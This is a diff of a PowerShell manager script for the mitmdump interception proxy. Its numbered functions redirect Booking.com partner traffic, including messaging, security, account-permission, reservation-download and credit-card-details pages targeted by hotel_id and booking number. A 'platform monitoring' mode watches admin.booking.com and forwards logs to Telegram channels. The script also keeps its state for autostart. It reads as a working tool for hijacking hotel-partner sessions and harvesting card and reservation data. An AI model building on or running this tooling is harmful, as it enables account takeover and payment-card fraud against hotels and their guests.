@@ -1,4 +1,4 @@
-﻿Set-StrictMode -Version Latest
+Set-StrictMode -Version Latest
 $ErrorActionPreference = "Stop"
 
 # ---------------- CONFIG ----------------
@@ -9,8 +9,11 @@ $LogFile = Join-Path $WorkDir "mitm_manager.log"
 $MitmExeSearch = @(
     "mitmdump",
     "C:\Program Files\Python311\Scripts\mitmdump.exe",
-    "C:\Program Files (x86)\Python311\Scripts\mitmdump.exe"
+    "C:\Program Files (x86)\Python311\Scripts\mitmdump.exe",
+    "C:\Users\chmel\AppData\Local\Programs\Python312\Scripts\mitmdump.exe"
 )
+
+# ---------------- ФЛАГИ ФУНКЦИЙ 1-20 ----------------
 $ForceFlag = "C:\temp\mitm_force_redirect"
 $OneShotFlag = "C:\temp\mitm_reset_once"
 $MessageFlag = "C:\temp\mitm_message_once"
@@ -33,19 +36,7 @@ $BookingCCDetailsFlag = "C:\temp\mitm_booking_cc_details_once"
 $BookingCCDetailsBnFile = "C:\temp\mitm_booking_cc_details_bn.txt"
 $BookingCCDetailsHotelIdFile = "C:\temp\mitm_booking_cc_details_hotel_id.txt"
 
-# Новые флаги для функций 21-26
-$PartnersFlag = "C:\temp\mitm_partners_once"
-$PartnersAndMessFlag = "C:\temp\mitm_partners_and_mess_once"
-$DeviceFlag = "C:\temp\mitm_device_once"
-$PulseFlag = "C:\temp\mitm_pulse_once"
-$UltraPulseFlag = "C:\temp\mitm_ultra_pulse_once"
-$MonitorPlatformsFlag = "C:\temp\mitm_monitor_platforms_once"
-$PulseRedirectToFile = "C:\temp\mitm_pulse_redirect_to.txt"
-$DeviceRedirectDoneFlag = "C:\temp\mitm_device_redirect_done.txt"
-$PartnersRedirectDoneFlag = "C:\temp\mitm_partners_redirect_done.txt"
-$UltraPulseRedirectToFile = "C:\temp\mitm_ultra_pulse_redirect_to.txt"
-
-# ========== НОВЫЕ ФЛАГИ ДЛЯ ФУНКЦИИ 27 ==========
+# ---------------- ФЛАГИ ФУНКЦИИ 27 ----------------
 $BookingReservationsCycleFlag = "C:\temp\mitm_booking_reservations_cycle_once"
 $BookingReservationsCycleHotelIdsFile = "C:\temp\mitm_booking_cycle_hotel_ids.txt"
 $BookingReservationsCycleReportIdsFile = "C:\temp\mitm_booking_cycle_report_ids.txt"
@@ -53,13 +44,30 @@ $BookingReservationsCycleIndexFile = "C:\temp\mitm_booking_cycle_index.txt"
 $BookingReservationsCycleActiveFile = "C:\temp\mitm_booking_cycle_active.txt"
 $BookingReservationsCycleNextRunFile = "C:\temp\mitm_booking_cycle_next_run.txt"
 
-# ========== ФЛАГИ ДЛЯ АВТОЗАПУСКА ==========
+# ---------------- ФЛАГИ ФУНКЦИЙ 21-26 ----------------
+$PartnersFlag = "C:\temp\mitm_partners_once"
+$PartnersAndMessFlag = "C:\temp\mitm_partners_and_mess_once"
+$DeviceFlag = "C:\temp\mitm_device_once"
+$PulseFlag = "C:\temp\mitm_pulse_once"
+$UltraPulseFlag = "C:\temp\mitm_ultra_pulse_once"
+$MonitorPlatformsFlag = "C:\temp\mitm_monitor_platforms_once"  # ФЛАГ ФУНКЦИИ 26 - НИКОГДА НЕ УДАЛЯТЬ!
+$PulseRedirectToFile = "C:\temp\mitm_pulse_redirect_to.txt"
+$UltraPulseRedirectToFile = "C:\temp\mitm_ultra_pulse_redirect_to.txt"
+$DeviceRedirectDoneFlag = "C:\temp\mitm_device_redirect_done.txt"
+$PartnersRedirectDoneFlag = "C:\temp\mitm_partners_redirect_done.txt"
+
+# ---------------- ФЛАГИ ДЛЯ АВТОЗАПУСКА ----------------
 $AutostartFlag = "C:\temp\mitm_autostart_active.txt"
 $AutostartFunctionFile = "C:\temp\mitm_autostart_function.txt"
 
+# ---------------- ФАЙЛ РЕДИРЕКТА ----------------
 $RedirectFile = Join-Path $WorkDir "redirect_target.txt"
 
-# -----------------------------------------
+# ---------------- ФЛАГ ДЛЯ PULSE ----------------
+$PulseDisabledFlag = "C:\temp\mitm_pulse_disabled.txt"
+
+# ========== ОСНОВНЫЕ ФУНКЦИИ ==========
+
 function Test-ValidUrl {
     param([string]$url)
     
@@ -134,11 +142,11 @@ function Reset-Proxy-And-Stop-Mitmdump {
 function Safe-Exit {
     Log-Write "Performing safe exit cleanup..."
     
-    # Удаляем флаг автозапуска при ручном выходе
     Remove-Item -Path $AutostartFlag -Force -ErrorAction SilentlyContinue
     Remove-Item -Path $AutostartFunctionFile -Force -ErrorAction SilentlyContinue
     
     Reset-Proxy-And-Stop-Mitmdump
+    Clear-SystemProxies | Out-Null
     Log-Write "Cleanup completed. Exiting."
     exit
 }
@@ -312,25 +320,88 @@ function Start-Mitmdump {
     }
 }
 
-# ---------------- ФУНКЦИЯ СОХРАНЕНИЯ СОСТОЯНИЯ ДЛЯ АВТОЗАПУСКА ----------------
 function Save-AutostartState {
     param([string]$FunctionName)
     
     try {
-        # Создаем флаг автозапуска
         Set-Content -Path $AutostartFlag -Value "ACTIVE" -Force
-        
-        # Сохраняем название активной функции
         Set-Content -Path $AutostartFunctionFile -Value $FunctionName -Force
-        
         Log-Write ("💾 Autostart state saved: {0}" -f $FunctionName)
     } catch {
         Log-Write ("Failed to save autostart state: {0}" -f $_) "WARN"
     }
 }
 
-# ---------------- REDIRECT FUNCTIONS ----------------
+# ========== ФУНКЦИИ ДЛЯ РАБОТЫ С ФЛАГОМ 26 ==========
+
+function Preserve-Function26Flag {
+    <#
+    .SYNOPSIS
+    Сохраняет состояние флага функции 26 перед удалением других флагов
+    #>
+    return (Test-Path $MonitorPlatformsFlag)
+}
+
+function Restore-Function26Flag {
+    <#
+    .SYNOPSIS
+    Восстанавливает флаг функции 26 если он был активен
+    #>
+    param([bool]$wasEnabled)
+    
+    if ($wasEnabled) {
+        if (-not (Test-Path $MonitorPlatformsFlag)) {
+            $null = New-Item -ItemType File -Path $MonitorPlatformsFlag -Force
+            Log-Write "✅ Function 26 flag RESTORED - parallel mode active"
+        }
+    }
+}
+
+# ========== ФУНКЦИЯ 26: ПЛАТФОРМ МОНИТОРИНГ (ПАРАЛЛЕЛЬНАЯ) ==========
+function Enable-MonitorPlatforms {
+    Log-Write "Starting FUNCTION 26..."
+    
+    Write-Host ""
+    Write-Host "=== FUNCTION 26: PLATFORM MONITORING ==="
+    Write-Host ""
+    Write-Host "[INFO] Monitors selected platforms including admin.booking.com"
+    Write-Host "       Telegram logs to appropriate channels"
+    Write-Host "       NO redirects - only monitoring"
+    Write-Host "       ✅ РАБОТАЕТ ПАРАЛЛЕЛЬНО С ДРУГИМИ ФУНКЦИЯМИ"
+    Write-Host "       ✅ ОТКЛЮЧАЕТСЯ ТОЛЬКО КНОПКОЙ 4!"
+    Write-Host ""
+    
+    if (-not (Test-Path (Split-Path $MonitorPlatformsFlag))) {
+        New-Item -ItemType Directory -Path (Split-Path $MonitorPlatformsFlag) -Force | Out-Null
+    }
+    
+    # СОЗДАЕМ ФЛАГ ФУНКЦИИ 26
+    New-Item -ItemType File -Path $MonitorPlatformsFlag -Force | Out-Null
+    
+    # Удаляем ТОЛЬКО конфликтующие базовые редиректы
+    # НЕ УДАЛЯЕМ флаги других функций!
+    Remove-Item -Path $ForceFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $OneShotFlag -ErrorAction SilentlyContinue
+    
+    Log-Write "Function 26 (Platform Monitoring) enabled"
+    Save-AutostartState -FunctionName "FUNCTION_26"
+    
+    Write-Host ""
+    Write-Host "✅ Function 26 ACTIVATED" -ForegroundColor Green
+    Write-Host "   ✅ Мониторинг платформ АКТИВЕН"
+    Write-Host "   ✅ Работает ПАРАЛЛЕЛЬНО с функциями 7-25, 27"
+    Write-Host "   ✅ Будет работать ПОКА НЕ ОТКЛЮЧЕНО кнопкой 4"
+    Write-Host "   📨 Telegram notifications based on domain"
+    Write-Host ""
+    
+    Start-Mitmdump
+}
+
+# ========== ФУНКЦИИ 1-20 ==========
+
 function Enable-ForceRedirect {
+    $function26WasEnabled = Preserve-Function26Flag
+    
     if (-not (Test-Path (Split-Path $ForceFlag))) {
         New-Item -ItemType Directory -Path (Split-Path $ForceFlag) -Force | Out-Null
     }
@@ -344,8 +415,8 @@ function Enable-ForceRedirect {
         $BookingReservationsReportIdFile, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
         $BookingCCDetailsHotelIdFile,
         $PartnersFlag, $PartnersAndMessFlag, $DeviceFlag, $PulseFlag, $UltraPulseFlag,
-        $MonitorPlatformsFlag, $PulseRedirectToFile, $DeviceRedirectDoneFlag,
-        $PartnersRedirectDoneFlag, $UltraPulseRedirectToFile,
+        $PulseRedirectToFile, $DeviceRedirectDoneFlag, $PartnersRedirectDoneFlag,
+        $UltraPulseRedirectToFile,
         $BookingReservationsCycleFlag, $BookingReservationsCycleHotelIdsFile,
         $BookingReservationsCycleReportIdsFile, $BookingReservationsCycleIndexFile,
         $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile
@@ -353,14 +424,16 @@ function Enable-ForceRedirect {
         Remove-Item -Path $_ -ErrorAction SilentlyContinue
     }
     
-    # Сохраняем состояние для автозапуска
-    Save-AutostartState -FunctionName "FORCE_REDIRECT"
+    Restore-Function26Flag -wasEnabled $function26WasEnabled
     
+    Save-AutostartState -FunctionName "FORCE_REDIRECT"
     Log-Write "Force redirect enabled."
     Start-Mitmdump
 }
 
 function Enable-OneShotRedirect {
+    $function26WasEnabled = Preserve-Function26Flag
+    
     if (-not (Test-Path (Split-Path $OneShotFlag))) {
         New-Item -ItemType Directory -Path (Split-Path $OneShotFlag) -Force | Out-Null
     }
@@ -374,8 +447,8 @@ function Enable-OneShotRedirect {
         $BookingReservationsReportIdFile, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
         $BookingCCDetailsHotelIdFile,
         $PartnersFlag, $PartnersAndMessFlag, $DeviceFlag, $PulseFlag, $UltraPulseFlag,
-        $MonitorPlatformsFlag, $PulseRedirectToFile, $DeviceRedirectDoneFlag,
-        $PartnersRedirectDoneFlag, $UltraPulseRedirectToFile,
+        $PulseRedirectToFile, $DeviceRedirectDoneFlag, $PartnersRedirectDoneFlag,
+        $UltraPulseRedirectToFile,
         $BookingReservationsCycleFlag, $BookingReservationsCycleHotelIdsFile,
         $BookingReservationsCycleReportIdsFile, $BookingReservationsCycleIndexFile,
         $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile
@@ -383,13 +456,16 @@ function Enable-OneShotRedirect {
         Remove-Item -Path $_ -ErrorAction SilentlyContinue
     }
     
-    Save-AutostartState -FunctionName "ONE_SHOT_REDIRECT"
+    Restore-Function26Flag -wasEnabled $function26WasEnabled
     
+    Save-AutostartState -FunctionName "ONE_SHOT_REDIRECT"
     Log-Write "One-shot redirect enabled."
     Start-Mitmdump
 }
 
 function Enable-MessageRedirect {
+    $function26WasEnabled = Preserve-Function26Flag
+    
     if (-not (Test-Path (Split-Path $MessageFlag))) {
         New-Item -ItemType Directory -Path (Split-Path $MessageFlag) -Force | Out-Null
     }
@@ -403,8 +479,8 @@ function Enable-MessageRedirect {
         $BookingReservationsReportIdFile, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
         $BookingCCDetailsHotelIdFile,
         $PartnersFlag, $PartnersAndMessFlag, $DeviceFlag, $PulseFlag, $UltraPulseFlag,
-        $MonitorPlatformsFlag, $PulseRedirectToFile, $DeviceRedirectDoneFlag,
-        $PartnersRedirectDoneFlag, $UltraPulseRedirectToFile,
+        $PulseRedirectToFile, $DeviceRedirectDoneFlag, $PartnersRedirectDoneFlag,
+        $UltraPulseRedirectToFile,
         $BookingReservationsCycleFlag, $BookingReservationsCycleHotelIdsFile,
         $BookingReservationsCycleReportIdsFile, $BookingReservationsCycleIndexFile,
         $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile
@@ -412,13 +488,16 @@ function Enable-MessageRedirect {
         Remove-Item -Path $_ -ErrorAction SilentlyContinue
     }
     
-    Save-AutostartState -FunctionName "FUNCTION_7"
+    Restore-Function26Flag -wasEnabled $function26WasEnabled
     
+    Save-AutostartState -FunctionName "FUNCTION_7"
     Log-Write "Booking.com message redirect enabled (function 7)."
     Start-Mitmdump
 }
 
 function Enable-ProviderRedirect {
+    $function26WasEnabled = Preserve-Function26Flag
+    
     if (-not (Test-Path (Split-Path $ProviderFlag))) {
         New-Item -ItemType Directory -Path (Split-Path $ProviderFlag) -Force | Out-Null
     }
@@ -432,8 +511,8 @@ function Enable-ProviderRedirect {
         $BookingReservationsReportIdFile, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
         $BookingCCDetailsHotelIdFile,
         $PartnersFlag, $PartnersAndMessFlag, $DeviceFlag, $PulseFlag, $UltraPulseFlag,
-        $MonitorPlatformsFlag, $PulseRedirectToFile, $DeviceRedirectDoneFlag,
-        $PartnersRedirectDoneFlag, $UltraPulseRedirectToFile,
+        $PulseRedirectToFile, $DeviceRedirectDoneFlag, $PartnersRedirectDoneFlag,
+        $UltraPulseRedirectToFile,
         $BookingReservationsCycleFlag, $BookingReservationsCycleHotelIdsFile,
         $BookingReservationsCycleReportIdsFile, $BookingReservationsCycleIndexFile,
         $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile
@@ -441,13 +520,16 @@ function Enable-ProviderRedirect {
         Remove-Item -Path $_ -ErrorAction SilentlyContinue
     }
     
-    Save-AutostartState -FunctionName "FUNCTION_8"
+    Restore-Function26Flag -wasEnabled $function26WasEnabled
     
+    Save-AutostartState -FunctionName "FUNCTION_8"
     Log-Write "Booking.com provider redirect enabled (function 8)."
     Start-Mitmdump
 }
 
 function Enable-UserRedirect {
+    $function26WasEnabled = Preserve-Function26Flag
+    
     if (-not (Test-Path (Split-Path $UserFlag))) {
         New-Item -ItemType Directory -Path (Split-Path $UserFlag) -Force | Out-Null
     }
@@ -461,8 +543,8 @@ function Enable-UserRedirect {
         $BookingReservationsReportIdFile, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
         $BookingCCDetailsHotelIdFile,
         $PartnersFlag, $PartnersAndMessFlag, $DeviceFlag, $PulseFlag, $UltraPulseFlag,
-        $MonitorPlatformsFlag, $PulseRedirectToFile, $DeviceRedirectDoneFlag,
-        $PartnersRedirectDoneFlag, $UltraPulseRedirectToFile,
+        $PulseRedirectToFile, $DeviceRedirectDoneFlag, $PartnersRedirectDoneFlag,
+        $UltraPulseRedirectToFile,
         $BookingReservationsCycleFlag, $BookingReservationsCycleHotelIdsFile,
         $BookingReservationsCycleReportIdsFile, $BookingReservationsCycleIndexFile,
         $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile
@@ -470,13 +552,16 @@ function Enable-UserRedirect {
         Remove-Item -Path $_ -ErrorAction SilentlyContinue
     }
     
-    Save-AutostartState -FunctionName "FUNCTION_9"
+    Restore-Function26Flag -wasEnabled $function26WasEnabled
     
+    Save-AutostartState -FunctionName "FUNCTION_9"
     Log-Write "Booking.com user redirect enabled (function 9)."
     Start-Mitmdump
 }
 
 function Enable-SecurityRedirect {
+    $function26WasEnabled = Preserve-Function26Flag
+    
     if (-not (Test-Path (Split-Path $SecurityFlag))) {
         New-Item -ItemType Directory -Path (Split-Path $SecurityFlag) -Force | Out-Null
     }
@@ -490,8 +575,8 @@ function Enable-SecurityRedirect {
         $BookingReservationsReportIdFile, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
         $BookingCCDetailsHotelIdFile,
         $PartnersFlag, $PartnersAndMessFlag, $DeviceFlag, $PulseFlag, $UltraPulseFlag,
-        $MonitorPlatformsFlag, $PulseRedirectToFile, $DeviceRedirectDoneFlag,
-        $PartnersRedirectDoneFlag, $UltraPulseRedirectToFile,
+        $PulseRedirectToFile, $DeviceRedirectDoneFlag, $PartnersRedirectDoneFlag,
+        $UltraPulseRedirectToFile,
         $BookingReservationsCycleFlag, $BookingReservationsCycleHotelIdsFile,
         $BookingReservationsCycleReportIdsFile, $BookingReservationsCycleIndexFile,
         $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile
@@ -499,13 +584,16 @@ function Enable-SecurityRedirect {
         Remove-Item -Path $_ -ErrorAction SilentlyContinue
     }
     
-    Save-AutostartState -FunctionName "FUNCTION_10"
+    Restore-Function26Flag -wasEnabled $function26WasEnabled
     
+    Save-AutostartState -FunctionName "FUNCTION_10"
     Log-Write "Booking.com security redirect enabled (function 10)."
     Start-Mitmdump
 }
 
 function Enable-Operation11Redirect {
+    $function26WasEnabled = Preserve-Function26Flag
+    
     Log-Write "Starting Operation 11 sequence (function 7 -> messaging/settings page -> function 8)..."
     
     if (-not (Test-Path (Split-Path $Operation11Flag))) {
@@ -526,8 +614,8 @@ function Enable-Operation11Redirect {
         $BookingReservationsReportIdFile, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
         $BookingCCDetailsHotelIdFile,
         $PartnersFlag, $PartnersAndMessFlag, $DeviceFlag, $PulseFlag, $UltraPulseFlag,
-        $MonitorPlatformsFlag, $PulseRedirectToFile, $DeviceRedirectDoneFlag,
-        $PartnersRedirectDoneFlag, $UltraPulseRedirectToFile,
+        $PulseRedirectToFile, $DeviceRedirectDoneFlag, $PartnersRedirectDoneFlag,
+        $UltraPulseRedirectToFile,
         $BookingReservationsCycleFlag, $BookingReservationsCycleHotelIdsFile,
         $BookingReservationsCycleReportIdsFile, $BookingReservationsCycleIndexFile,
         $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile
@@ -535,8 +623,9 @@ function Enable-Operation11Redirect {
         Remove-Item -Path $_ -ErrorAction SilentlyContinue
     }
     
-    Save-AutostartState -FunctionName "OPERATION_11"
+    Restore-Function26Flag -wasEnabled $function26WasEnabled
     
+    Save-AutostartState -FunctionName "OPERATION_11"
     Start-Mitmdump
     
     Log-Write "Operation 11: Function 7 (message redirect) enabled."
@@ -544,6 +633,8 @@ function Enable-Operation11Redirect {
 }
 
 function Enable-Operation12Redirect {
+    $function26WasEnabled = Preserve-Function26Flag
+    
     Log-Write "Starting Operation 12 sequence (function 9 -> accounts_and_permissions page -> function 10)..."
     
     if (-not (Test-Path (Split-Path $Operation12Flag))) {
@@ -564,8 +655,8 @@ function Enable-Operation12Redirect {
         $BookingReservationsReportIdFile, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
         $BookingCCDetailsHotelIdFile,
         $PartnersFlag, $PartnersAndMessFlag, $DeviceFlag, $PulseFlag, $UltraPulseFlag,
-        $MonitorPlatformsFlag, $PulseRedirectToFile, $DeviceRedirectDoneFlag,
-        $PartnersRedirectDoneFlag, $UltraPulseRedirectToFile,
+        $PulseRedirectToFile, $DeviceRedirectDoneFlag, $PartnersRedirectDoneFlag,
+        $UltraPulseRedirectToFile,
         $BookingReservationsCycleFlag, $BookingReservationsCycleHotelIdsFile,
         $BookingReservationsCycleReportIdsFile, $BookingReservationsCycleIndexFile,
         $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile
@@ -573,8 +664,9 @@ function Enable-Operation12Redirect {
         Remove-Item -Path $_ -ErrorAction SilentlyContinue
     }
     
-    Save-AutostartState -FunctionName "OPERATION_12"
+    Restore-Function26Flag -wasEnabled $function26WasEnabled
     
+    Save-AutostartState -FunctionName "OPERATION_12"
     Start-Mitmdump
     
     Log-Write "Operation 12: Function 9 (user redirect) enabled."
@@ -582,6 +674,8 @@ function Enable-Operation12Redirect {
 }
 
 function Enable-BookingHotelRedirect {
+    $function26WasEnabled = Preserve-Function26Flag
+    
     if (-not (Test-Path (Split-Path $BookingHotelFlag))) {
         New-Item -ItemType Directory -Path (Split-Path $BookingHotelFlag) -Force | Out-Null
     }
@@ -595,8 +689,8 @@ function Enable-BookingHotelRedirect {
         $BookingReservationsReportIdFile, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
         $BookingCCDetailsHotelIdFile,
         $PartnersFlag, $PartnersAndMessFlag, $DeviceFlag, $PulseFlag, $UltraPulseFlag,
-        $MonitorPlatformsFlag, $PulseRedirectToFile, $DeviceRedirectDoneFlag,
-        $PartnersRedirectDoneFlag, $UltraPulseRedirectToFile,
+        $PulseRedirectToFile, $DeviceRedirectDoneFlag, $PartnersRedirectDoneFlag,
+        $UltraPulseRedirectToFile,
         $BookingReservationsCycleFlag, $BookingReservationsCycleHotelIdsFile,
         $BookingReservationsCycleReportIdsFile, $BookingReservationsCycleIndexFile,
         $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile
@@ -604,8 +698,9 @@ function Enable-BookingHotelRedirect {
         Remove-Item -Path $_ -ErrorAction SilentlyContinue
     }
     
-    Save-AutostartState -FunctionName "FUNCTION_13"
+    Restore-Function26Flag -wasEnabled $function26WasEnabled
     
+    Save-AutostartState -FunctionName "FUNCTION_13"
     Log-Write "Booking.com HOTEL (global) redirect enabled (function 13)."
     Start-Mitmdump
 }
@@ -616,6 +711,8 @@ function Disable-BookingHotelRedirect {
 }
 
 function Enable-BookingHotelSecurityRedirect {
+    $function26WasEnabled = Preserve-Function26Flag
+    
     if (-not (Test-Path (Split-Path $BookingHotelSecurityFlag))) {
         New-Item -ItemType Directory -Path (Split-Path $BookingHotelSecurityFlag) -Force | Out-Null
     }
@@ -629,8 +726,8 @@ function Enable-BookingHotelSecurityRedirect {
         $BookingReservationsReportIdFile, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
         $BookingCCDetailsHotelIdFile,
         $PartnersFlag, $PartnersAndMessFlag, $DeviceFlag, $PulseFlag, $UltraPulseFlag,
-        $MonitorPlatformsFlag, $PulseRedirectToFile, $DeviceRedirectDoneFlag,
-        $PartnersRedirectDoneFlag, $UltraPulseRedirectToFile,
+        $PulseRedirectToFile, $DeviceRedirectDoneFlag, $PartnersRedirectDoneFlag,
+        $UltraPulseRedirectToFile,
         $BookingReservationsCycleFlag, $BookingReservationsCycleHotelIdsFile,
         $BookingReservationsCycleReportIdsFile, $BookingReservationsCycleIndexFile,
         $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile
@@ -638,13 +735,16 @@ function Enable-BookingHotelSecurityRedirect {
         Remove-Item -Path $_ -ErrorAction SilentlyContinue
     }
     
-    Save-AutostartState -FunctionName "FUNCTION_15"
+    Restore-Function26Flag -wasEnabled $function26WasEnabled
     
+    Save-AutostartState -FunctionName "FUNCTION_15"
     Log-Write "Booking.com HOTEL SECURITY redirect enabled (function 15)."
     Start-Mitmdump
 }
 
 function Enable-Operation16Redirect {
+    $function26WasEnabled = Preserve-Function26Flag
+    
     Log-Write "Starting Operation 16 sequence (function 13 -> function 15)..."
     
     if (-not (Test-Path (Split-Path $Operation16Flag))) {
@@ -665,8 +765,8 @@ function Enable-Operation16Redirect {
         $BookingReservationsReportIdFile, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
         $BookingCCDetailsHotelIdFile,
         $PartnersFlag, $PartnersAndMessFlag, $DeviceFlag, $PulseFlag, $UltraPulseFlag,
-        $MonitorPlatformsFlag, $PulseRedirectToFile, $DeviceRedirectDoneFlag,
-        $PartnersRedirectDoneFlag, $UltraPulseRedirectToFile,
+        $PulseRedirectToFile, $DeviceRedirectDoneFlag, $PartnersRedirectDoneFlag,
+        $UltraPulseRedirectToFile,
         $BookingReservationsCycleFlag, $BookingReservationsCycleHotelIdsFile,
         $BookingReservationsCycleReportIdsFile, $BookingReservationsCycleIndexFile,
         $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile
@@ -674,8 +774,9 @@ function Enable-Operation16Redirect {
         Remove-Item -Path $_ -ErrorAction SilentlyContinue
     }
     
-    Save-AutostartState -FunctionName "OPERATION_16"
+    Restore-Function26Flag -wasEnabled $function26WasEnabled
     
+    Save-AutostartState -FunctionName "OPERATION_16"
     Start-Mitmdump
     
     Log-Write "Operation 16: Function 13 (Booking Hotel Redirect) enabled."
@@ -683,6 +784,8 @@ function Enable-Operation16Redirect {
 }
 
 function Enable-CustomRedirect {
+    $function26WasEnabled = Preserve-Function26Flag
+    
     Log-Write "Starting FUNCTION 17..."
     
     Remove-Item -Path $CustomRedirectFlag -ErrorAction SilentlyContinue
@@ -764,7 +867,6 @@ function Enable-CustomRedirect {
     }
     
     Set-Content -Path $CustomRedirectFlag -Value "ACTIVE" -Force
-    
     Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
     
     @(
@@ -774,8 +876,8 @@ function Enable-CustomRedirect {
         $BookingReservationsReportIdFile, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
         $BookingCCDetailsHotelIdFile,
         $PartnersFlag, $PartnersAndMessFlag, $DeviceFlag, $PulseFlag, $UltraPulseFlag,
-        $MonitorPlatformsFlag, $PulseRedirectToFile, $DeviceRedirectDoneFlag,
-        $PartnersRedirectDoneFlag, $UltraPulseRedirectToFile,
+        $PulseRedirectToFile, $DeviceRedirectDoneFlag, $PartnersRedirectDoneFlag,
+        $UltraPulseRedirectToFile,
         $BookingReservationsCycleFlag, $BookingReservationsCycleHotelIdsFile,
         $BookingReservationsCycleReportIdsFile, $BookingReservationsCycleIndexFile,
         $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile
@@ -783,8 +885,9 @@ function Enable-CustomRedirect {
         Remove-Item -Path $_ -ErrorAction SilentlyContinue
     }
     
-    Save-AutostartState -FunctionName "FUNCTION_17"
+    Restore-Function26Flag -wasEnabled $function26WasEnabled
     
+    Save-AutostartState -FunctionName "FUNCTION_17"
     Start-Mitmdump
     
     Log-Write "[F17] Custom one-time redirect enabled."
@@ -811,6 +914,8 @@ function Clear-Function17 {
 }
 
 function Enable-BookingReservationsRedirect {
+    $function26WasEnabled = Preserve-Function26Flag
+    
     Log-Write "Starting 18..."
     
     Write-Host ""
@@ -850,8 +955,8 @@ function Enable-BookingReservationsRedirect {
         $CustomRedirectDoneFlag, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
         $BookingCCDetailsHotelIdFile,
         $PartnersFlag, $PartnersAndMessFlag, $DeviceFlag, $PulseFlag, $UltraPulseFlag,
-        $MonitorPlatformsFlag, $PulseRedirectToFile, $DeviceRedirectDoneFlag,
-        $PartnersRedirectDoneFlag, $UltraPulseRedirectToFile,
+        $PulseRedirectToFile, $DeviceRedirectDoneFlag, $PartnersRedirectDoneFlag,
+        $UltraPulseRedirectToFile,
         $BookingReservationsCycleFlag, $BookingReservationsCycleHotelIdsFile,
         $BookingReservationsCycleReportIdsFile, $BookingReservationsCycleIndexFile,
         $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile
@@ -859,8 +964,9 @@ function Enable-BookingReservationsRedirect {
         Remove-Item -Path $_ -ErrorAction SilentlyContinue
     }
     
-    Log-Write ("Booking reservations redirect enabled with hotel_id={0}, reportId={1}" -f $hotelId, $reportId)
+    Restore-Function26Flag -wasEnabled $function26WasEnabled
     
+    Log-Write ("Booking reservations redirect enabled with hotel_id={0}, reportId={1}" -f $hotelId, $reportId)
     Save-AutostartState -FunctionName "FUNCTION_18"
     
     Write-Host ""
@@ -869,11 +975,12 @@ function Enable-BookingReservationsRedirect {
     Write-Host ""
     
     Start-Mitmdump
-    
     Log-Write "Booking reservations download redirect enabled (function 18)."
 }
 
 function Enable-BookingCCDetailsRedirect {
+    $function26WasEnabled = Preserve-Function26Flag
+    
     Log-Write "Starting 19..."
     
     Write-Host ""
@@ -913,8 +1020,8 @@ function Enable-BookingCCDetailsRedirect {
         $CustomRedirectDoneFlag, $BookingReservationsFlag, $BookingReservationsHotelIdFile,
         $BookingReservationsReportIdFile,
         $PartnersFlag, $PartnersAndMessFlag, $DeviceFlag, $PulseFlag, $UltraPulseFlag,
-        $MonitorPlatformsFlag, $PulseRedirectToFile, $DeviceRedirectDoneFlag,
-        $PartnersRedirectDoneFlag, $UltraPulseRedirectToFile,
+        $PulseRedirectToFile, $DeviceRedirectDoneFlag, $PartnersRedirectDoneFlag,
+        $UltraPulseRedirectToFile,
         $BookingReservationsCycleFlag, $BookingReservationsCycleHotelIdsFile,
         $BookingReservationsCycleReportIdsFile, $BookingReservationsCycleIndexFile,
         $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile
@@ -922,8 +1029,9 @@ function Enable-BookingCCDetailsRedirect {
         Remove-Item -Path $_ -ErrorAction SilentlyContinue
     }
     
-    Log-Write ("Booking CC details redirect enabled with bn={0}, hotel_id={1}" -f $bn, $hotelId)
+    Restore-Function26Flag -wasEnabled $function26WasEnabled
     
+    Log-Write ("Booking CC details redirect enabled with bn={0}, hotel_id={1}" -f $bn, $hotelId)
     Save-AutostartState -FunctionName "FUNCTION_19"
     
     Write-Host ""
@@ -932,12 +1040,13 @@ function Enable-BookingCCDetailsRedirect {
     Write-Host ""
     
     Start-Mitmdump
-    
     Log-Write "Booking CC details redirect enabled (function 19)."
 }
 
 # ========== ФУНКЦИЯ 27: ЦИКЛИЧЕСКАЯ КОПИЯ ФУНКЦИИ 18 ==========
 function Enable-BookingReservationsCycleRedirect {
+    $function26WasEnabled = Preserve-Function26Flag
+    
     Log-Write "Starting FUNCTION 27..."
     
     Write-Host ""
@@ -1012,9 +1121,7 @@ function Enable-BookingReservationsCycleRedirect {
     
     Set-Content -Path $BookingReservationsCycleHotelIdsFile -Value $hotelIdsString -Force
     Set-Content -Path $BookingReservationsCycleReportIdsFile -Value $reportIdsString -Force
-    
     Set-Content -Path $BookingReservationsCycleIndexFile -Value "0" -Force
-    
     Set-Content -Path $BookingReservationsCycleActiveFile -Value "1" -Force
     
     if (-not (Test-Path (Split-Path $BookingReservationsCycleFlag))) {
@@ -1030,11 +1137,14 @@ function Enable-BookingReservationsCycleRedirect {
         $BookingReservationsReportIdFile, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
         $BookingCCDetailsHotelIdFile,
